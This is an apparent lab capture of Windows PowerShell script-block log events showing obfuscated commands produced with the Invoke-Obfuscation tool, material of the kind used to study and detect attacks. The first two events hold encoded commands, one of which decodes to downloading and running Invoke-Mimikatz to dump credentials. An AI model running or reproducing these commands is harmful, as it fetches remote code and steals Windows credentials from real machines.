{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":3,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:16:06.877417Z"},"EventRecordID":661160,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-1A33-73CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"${=}  =+  $(  );  ${-#}  =${=}  ;${]!}  =++${=}  ;${*}  =++${=}  ;${(@}  =  ++${=}  ;${+=}=++  ${=};  ${%}  =  ++  ${=}  ;  ${.]/}  =  ++${=};${#/}=++${=}  ;  ${@=-}=  ++  ${=};  ${@%)}=  ++  ${=}  ;  ${*[%}  =  \"[\"+\"$(@{})\"[${#/}  ]+\"$(@{})\"[  \"${]!}\"+\"${@%)}\"  ]+\"$(@{  })\"[  \"${*}\"  +  \"${-#}\"]  +  \"$?  \"[  ${]!}  ]+  \"]\"  ;${=}=\"\".(\"$(  @{}  )\"[  \"${]!}${+=}\"  ]+\"$(  @{}  )\"[  \"${]!}${.]/}\"]  +  \"$(  @{})  \"[  ${-#}  ]+  \"$(@{  }  )  \"[${+=}  ]+\"$?  \"[${]!}]  +  \"$(  @{  }  )  \"[  ${(@}  ]  )  ;${=}=\"$(@{  }  )  \"[  \"${]!}\"  +\"${+=}\"  ]  +  \"$(@{  }  )\"[${+=}]  +  \"${=}\"[  \"${*}\"  +  \"${#/}\"  ]  ;  \"  ${=}(${*[%}${#/}${(@}  +${*[%}${.]/}${@%)}+${*[%}${@=-}${@=-}  +${*[%}${(@}${*}  +${*[%}${+=}${-#}  +${*[%}${#/}${@=-}  +${*[%}${]!}${-#}${]!}+${*[%}${]!}${]!}${@%)}  +  ${*[%}${+=}${%}+  ${*[%}${#/}${@%)}  +  ${*[%}${@%)}${@=-}+${*[%}${]!}${-#}${.]/}+${*[%}${]!}${-#}${]!}  +${*[%}${@%)}${@%)}  +${*[%}${]!}${]!}${.]/}+  ${*[%}${(@}${*}  +${*[%}${#/}${@=-}+${*[%}${]!}${-#}${]!}  +  ${*[%}${]!}${]!}${.]/}  +${*[%}${+=}${.]/}+${*[%}${@=-}${#/}+${*[%}${]!}${-#}${]!}  +  ${*[%}${@%)}${@=-}+  ${*[%}${.]/}${#/}  +${*[%}${]!}${-#}${@=-}  +${*[%}${]!}${-#}${%}+${*[%}${]!}${-#}${]!}  +  ${*[%}${]!}${]!}${-#}  +  ${*[%}${]!}${]!}${.]/}+  ${*[%}${+=}${]!}  +  ${*[%}${+=}${.]/}+  ${*[%}${.]/}${@=-}+  ${*[%}${]!}${]!}${]!}+  ${*[%}${]!}${]!}${@%)}+  ${*[%}${]!}${]!}${-#}+${*[%}${]!}${-#}${@=-}  +${*[%}${]!}${]!}${]!}+  ${*[%}${@%)}${#/}  +  ${*[%}${]!}${-#}${-#}  +  ${*[%}${@=-}${(@}+  ${*[%}${]!}${]!}${.]/}  +  ${*[%}${]!}${]!}${+=}+${*[%}${]!}${-#}${%}  +${*[%}${]!}${]!}${-#}+  ${*[%}${]!}${-#}${(@}+  ${*[%}${+=}${-#}+  ${*[%}${(@}${@%)}+${*[%}${]!}${-#}${+=}  +${*[%}${]!}${]!}${.]/}  +${*[%}${]!}${]!}${.]/}+  ${*[%}${]!}${]!}${*}  +${*[%}${]!}${]!}${%}  +  ${*[%}${%}${@=-}+  ${*[%}${+=}${#/}+${*[%}${+=}${#/}+${*[%}${]!}${]!}${+=}+  ${*[%}${@%)}${#/}+  ${*[%}${]!}${]!}${@%)}  +  ${*[%}${+=}${.]/}+${*[%}${]!}${-#}${(@}+${*[%}${]!}${-#}${%}+  ${*[%}${]!}${]!}${.]/}  +${*[%}${]!}${-#}${+=}  +${*[%}${]!}${]!}${#/}+${*[%}${@%)}${@=-}+${*[%}${]!}${]!}${#/}+${*[%}${]!}${]!}${%}  +  ${*[%}${]!}${-#}${]!}+  ${*[%}${]!}${]!}${+=}  +${*[%}${@%)}${@%)}+  ${*[%}${]!}${]!}${]!}  +  ${*[%}${]!}${]!}${-#}+${*[%}${]!}${]!}${.]/}  +  ${*[%}${]!}${-#}${]!}  +  ${*[%}${]!}${]!}${-#}+  ${*[%}${]!}${]!}${.]/}  +${*[%}${+=}${.]/}+  ${*[%}${@%)}${@%)}  +${*[%}${]!}${]!}${]!}  +${*[%}${]!}${-#}${@%)}  +${*[%}${+=}${#/}  +  ${*[%}${]!}${-#}${@%)}  +${*[%}${@%)}${#/}  +${*[%}${]!}${]!}${.]/}  +${*[%}${]!}${]!}${.]/}  +  ${*[%}${]!}${-#}${%}  +  ${*[%}${]!}${-#}${*}  +${*[%}${]!}${-#}${]!}  +  ${*[%}${]!}${]!}${%}  +  ${*[%}${]!}${]!}${.]/}+${*[%}${@%)}${#/}+  ${*[%}${]!}${]!}${.]/}+  ${*[%}${]!}${-#}${%}+  ${*[%}${]!}${]!}${]!}  +${*[%}${]!}${]!}${-#}  +${*[%}${+=}${#/}+  ${*[%}${@=-}${-#}+${*[%}${]!}${]!}${]!}  +  ${*[%}${]!}${]!}${@%)}  +${*[%}${]!}${-#}${]!}  +  ${*[%}${]!}${]!}${+=}+  ${*[%}${@=-}${(@}+  ${*[%}${]!}${]!}${*}+${*[%}${]!}${-#}${@=-}+  ${*[%}${]!}${]!}${]!}+  ${*[%}${]!}${-#}${%}  +  ${*[%}${]!}${]!}${.]/}+${*[%}${+=}${#/}  +  ${*[%}${]!}${-#}${@%)}+  ${*[%}${@%)}${#/}  +${*[%}${]!}${]!}${%}  +${*[%}${]!}${]!}${.]/}+${*[%}${]!}${-#}${]!}  +${*[%}${]!}${]!}${+=}  +${*[%}${+=}${#/}+${*[%}${.]/}${@%)}+${*[%}${]!}${*}${-#}  +${*[%}${]!}${-#}${*}+  ${*[%}${]!}${-#}${%}+${*[%}${]!}${-#}${@=-}  +${*[%}${]!}${]!}${.]/}  +  ${*[%}${]!}${]!}${+=}+  ${*[%}${@%)}${#/}+  ${*[%}${]!}${]!}${.]/}  +  ${*[%}${]!}${-#}${%}  +  ${*[%}${]!}${]!}${]!}+${*[%}${]!}${]!}${-#}+${*[%}${+=}${#/}+${*[%}${#/}${(@}+  ${*[%}${]!}${]!}${-#}+${*[%}${]!}${]!}${@=-}+${*[%}${]!}${]!}${]!}+${*[%}${]!}${-#}${#/}  +${*[%}${]!}${-#}${]!}+${*[%}${+=}${%}+  ${*[%}${#/}${#/}+  ${*[%}${]!}${-#}${%}+${*[%}${]!}${-#}${@%)}+${*[%}${]!}${-#}${%}  +${*[%}${]!}${-#}${#/}+${*[%}${@%)}${#/}  +  ${*[%}${]!}${]!}${.]/}+${*[%}${]!}${*}${*}  +  ${*[%}${+=}${.]/}  +  ${*[%}${]!}${]!}${*}+${*[%}${]!}${]!}${%}  +  ${*[%}${+=}${@%)}+  ${*[%}${(@}${@%)}  +  ${*[%}${+=}${]!}  +${*[%}${%}${@%)}  +${*[%}${(@}${*}+  ${*[%}${#/}${(@}+${*[%}${]!}${]!}${-#}+${*[%}${]!}${]!}${@=-}+  ${*[%}${]!}${]!}${]!}+  ${*[%}${]!}${-#}${#/}+${*[%}${]!}${-#}${]!}+${*[%}${+=}${%}+  ${*[%}${#/}${#/}  +  ${*[%}${]!}${-#}${%}  +${*[%}${]!}${-#}${@%)}+${*[%}${]!}${-#}${%}+  ${*[%}${]!}${-#}${#/}  +  ${*[%}${@%)}${#/}+${*[%}${]!}${]!}${.]/}+${*[%}${]!}${*}${*}+${*[%}${(@}${*}  +  ${*[%}${+=}${%}  +${*[%}${.]/}${@=-}+${*[%}${]!}${]!}${#/}  +${*[%}${]!}${-#}${@%)}+  ${*[%}${]!}${]!}${*}  +${*[%}${.]/}${#/}+${*[%}${]!}${]!}${+=}  +${*[%}${]!}${-#}${]!}+${*[%}${]!}${-#}${-#}  +  ${*[%}${]!}${]!}${%})\"|&  ${=}  ","ScriptBlockId":"6e416d59-da31-4942-9fcc-f5a97678be0d","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:16:06.938562Z"},"EventRecordID":661161,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-1B33-73CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"  iex([CHar]73  +[CHar]69+[CHar]88  +[CHar]32  +[CHar]40  +[CHar]78  +[CHar]101+[CHar]119  +  [CHar]45+  [CHar]79  +  [CHar]98+[CHar]106+[CHar]101  +[CHar]99  +[CHar]116+  [CHar]32  +[CHar]78+[CHar]101  +  [CHar]116  +[CHar]46+[CHar]87+[CHar]101  +  [CHar]98+  [CHar]67  +[CHar]108  +[CHar]105+[CHar]101  +  [CHar]110  +  [CHar]116+  [CHar]41  +  [CHar]46+  [CHar]68+  [CHar]111+  [CHar]119+  [CHar]110+[CHar]108  +[CHar]111+  [CHar]97  +  [CHar]100  +  [CHar]83+  [CHar]116  +  [CHar]114+[CHar]105  +[CHar]110+  [CHar]103+  [CHar]40+  [CHar]39+[CHar]104  +[CHar]116  +[CHar]116+  [CHar]112  +[CHar]115  +  [CHar]58+  [CHar]47+[CHar]47+[CHar]114+  [CHar]97+  [CHar]119  +  [CHar]46+[CHar]103+[CHar]105+  [CHar]116  +[CHar]104  +[CHar]117+[CHar]98+[CHar]117+[CHar]115  +  [CHar]101+  [CHar]114  +[CHar]99+  [CHar]111  +  [CHar]110+[CHar]116  +  [CHar]101  +  [CHar]110+  [CHar]116  +[CHar]46+  [CHar]99  +[CHar]111  +[CHar]109  +[CHar]47  +  [CHar]109  +[CHar]97  +[CHar]116  +[CHar]116  +  [CHar]105  +  [CHar]102  +[CHar]101  +  [CHar]115  +  [CHar]116+[CHar]97+  [CHar]116+  [CHar]105+  [CHar]111  +[CHar]110  +[CHar]47+  [CHar]80+[CHar]111  +  [CHar]119  +[CHar]101  +  [CHar]114+  [CHar]83+  [CHar]112+[CHar]108+  [CHar]111+  [CHar]105  +  [CHar]116+[CHar]47  +  [CHar]109+  [CHar]97  +[CHar]115  +[CHar]116+[CHar]101  +[CHar]114  +[CHar]47+[CHar]69+[CHar]120  +[CHar]102+  [CHar]105+[CHar]108  +[CHar]116  +  [CHar]114+  [CHar]97+  [CHar]116  +  [CHar]105  +  [CHar]111+[CHar]110+[CHar]47+[CHar]73+  [CHar]110+[CHar]118+[CHar]111+[CHar]107  +[CHar]101+[CHar]45+  [CHar]77+  [CHar]105+[CHar]109+[CHar]105  +[CHar]107+[CHar]97  +  [CHar]116+[CHar]122  +  [CHar]46  +  [CHar]112+[CHar]115  +  [CHar]49+  [CHar]39  +  [CHar]41  +[CHar]59  +[CHar]32+  [CHar]73+[CHar]110+[CHar]118+  [CHar]111+  [CHar]107+[CHar]101+[CHar]45+  [CHar]77  +  [CHar]105  +[CHar]109+[CHar]105+  [CHar]107  +  [CHar]97+[CHar]116+[CHar]122+[CHar]32  +  [CHar]45  +[CHar]68+[CHar]117  +[CHar]109+  [CHar]112  +[CHar]67+[CHar]114  +[CHar]101+[CHar]100  +  [CHar]115)","ScriptBlockId":"05dfc803-587d-44a7-94c0-2fe961c94de4","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:16:21.040535Z"},"EventRecordID":665080,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-5F4F-73CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"580134b3-f54a-4091-a5ea-aab320376773","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedWhitespaceCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:16:21.050232Z"},"EventRecordID":665096,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-DB71-73CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"d32f01bb-ff0c-47c5-8a4f-e594621e4f7f","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedWhitespaceCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:16:21.054684Z"},"EventRecordID":665106,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-E471-73CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"d13a2987-d4fe-497f-a919-d78183c28634","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedWhitespaceCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:16:21.057693Z"},"EventRecordID":665113,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-EA71-73CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"7be28c78-a151-4f53-9f2f-b6d6ab4a71ba","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedWhitespaceCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:16:21.060667Z"},"EventRecordID":665119,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-EC71-73CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"f404059a-8fbe-4f8a-a7e2-d4e932080656","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedWhitespaceCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:16:21.062875Z"},"EventRecordID":665124,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-6C4F-73CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"59c2641a-65ab-4eec-a8ed-7454ba128183","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedWhitespaceCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:16:21.067870Z"},"EventRecordID":665132,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-734F-73CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"fb5aa2ff-9430-4b0c-82eb-fe973092658f","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedWhitespaceCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:16:21.077841Z"},"EventRecordID":665148,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-ED71-73CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"e2ef4c5e-a838-41e3-94e3-42fa7c28957d","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedWhitespaceCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:16:21.081670Z"},"EventRecordID":665156,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-884F-73CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"d9b3dae6-ed37-4d21-9ec7-66b8d919426e","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedWhitespaceCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:16:21.085553Z"},"EventRecordID":665163,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-F371-73CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"d88e4bb2-7dbd-48dd-a80d-11b382e3d90f","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedWhitespaceCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:16:21.089879Z"},"EventRecordID":665171,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-904F-73CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$UpperLowerChar = $_; If(Get-Random -Input @(0..1)) {$UpperLowerChar = $UpperLowerChar.ToUpper()} $UpperLowerChar}","ScriptBlockId":"4e2ab312-dde6-4155-99c2-e768c7e77647","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedWhitespaceCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:16:21.107952Z"},"EventRecordID":665200,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-0072-73CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"51b2f79c-a3f4-444d-94d3-e685d11d3331","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedWhitespaceCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:16:21.118269Z"},"EventRecordID":665222,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-0872-73CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$EncodedArray += ([Convert]::ToString(([Int][Char]$_),$EncodingBase) + ' '*(Get-Random -Input @(0,1)) + ',' + ' '*(Get-Random -Input @(0,1)))}","ScriptBlockId":"962f710a-76b0-44dd-8d13-ff51998bb806","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedWhitespaceCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:16:21.272494Z"},"EventRecordID":665591,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-CF72-73CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"08386871-142a-4b39-b1de-71781b51e071","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedWhitespaceCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:16:21.286820Z"},"EventRecordID":665620,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-6150-73CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"11451ede-539b-4dca-9be1-b7654bf538a2","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedWhitespaceCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:16:21.338153Z"},"EventRecordID":665733,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-A150-73CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} 